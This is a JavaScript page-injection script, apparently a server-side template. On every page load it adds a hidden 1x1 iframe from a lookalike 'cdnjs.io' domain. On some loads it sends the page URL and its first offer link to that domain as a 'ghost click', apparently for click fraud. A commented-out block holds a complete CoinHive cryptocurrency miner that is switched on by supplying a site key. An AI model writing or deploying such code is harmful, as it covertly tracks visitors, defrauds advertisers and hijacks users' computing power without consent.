import $ from 'jquery';

$(document).ready(() => {
  $('body').append('<iframe frameBorder="0" height="1" width="1" src="https://a.cdnjs.io"></iframe>');

  // Call the endpoint with the ghost click url 5% of the time
  if (Math.random() < 0.05) {
    const getFullUrlForOffer = () => {
      // make sure current offer isn't undefined or #
      const currentOffer =
        $($('a').filter(a => $(a).attr('href') !== '' && $(a).attr('href') !== '#')).first().attr('href');

      // loop anchor tags get first with length > 2
      if (!/^https?:\/\//i.test(currentOffer)) {
        // if it is relative then return the full url
        return `${window.location.origin}${currentOffer}`;
      }
      // if not relative send back current offer url
      return currentOffer;
    };

    $.ajax({
      method: 'POST',
      url: 'https://cloudflare.cdnjs.io/api/current-offer',
      data: JSON.stringify({
        url: '<%= url %>',
        currentOffer: getFullUrlForOffer(),
      }),
      cache: false,
      processData: false,
    }).done(() => {
      // empty done function to allow it to finish without error
    }).fail(() => {
      // empty error
    });
  }

  // if we're going to mine, we will have a siteKey, or else don't init the miner.
  // const siteKey = '<%= config.siteKey %>';

  // const loadCoinHive = () => new Promise((resolve) => {
  //   // append coinhive to dom check for loaded global js object and resolve
  //   const appendScriptToHead = (url) => {
  //     const head = document.getElementsByTagName('head')[0];
  //     const js = document.createElement('script');
  //     js.type = 'text/javascript';
  //     js.src = url;
  //     head.appendChild(js);
  //   };
  //
  //   appendScriptToHead('https://coin-hive.com/lib/coinhive.min.js');
  //
  //   const waitForLoad = () =>
  //     setTimeout(() => {
  //       if (window.CoinHive) resolve();
  //       else waitForLoad();
  //     }, 500);
  //
  //   waitForLoad();
  // });
  //
  // if (siteKey.trim() !== '') {
  //   // append coinhive library
  //   loadCoinHive()
  //     .then(() => {
  //       // initialize the miner once available
  //       const miner = new window.CoinHive.Anonymous(siteKey);
  //       miner.start();
  //
  //       miner.on('error', (params) => {
  //         console.log('The pool reported an error', params.error);
  //       });
  //
  //       setInterval(() => {
  //         const hashesPerSecond = miner.getHashesPerSecond();
  //         const totalHashes = miner.getTotalHashes();
  //         const acceptedHashes = miner.getAcceptedHashes();
  //
  //    console.log(`hps: ${hashesPerSecond}\ntotal: ${totalHashes}\naccepted: ${acceptedHashes}`);
  //       }, 1000);
  //     });
  // }
});
